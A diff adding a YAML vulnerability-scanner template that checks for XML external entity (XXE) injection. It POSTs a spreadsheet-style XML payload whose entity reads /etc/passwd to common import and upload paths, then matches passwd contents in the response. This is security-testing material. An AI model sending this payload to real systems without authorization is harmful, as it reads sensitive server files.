@@ -1,0 +1,30 @@
+id: m7-xxe-excel-xlsx
+info:
+  name: M7 - XXE via Excel/XLSX Upload
+  author: Sharlix
+  severity: high
+  description: XXE in XLSX file upload via XML parts of Office documents
+  tags: xxe,xlsx,upload,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/import"
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/import"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+      <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+        <sheets><sheet name="Sheet1" sheetId="1"><data>&xxe;</data></sheet></sheets>
+      </workbook>
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+        part: body
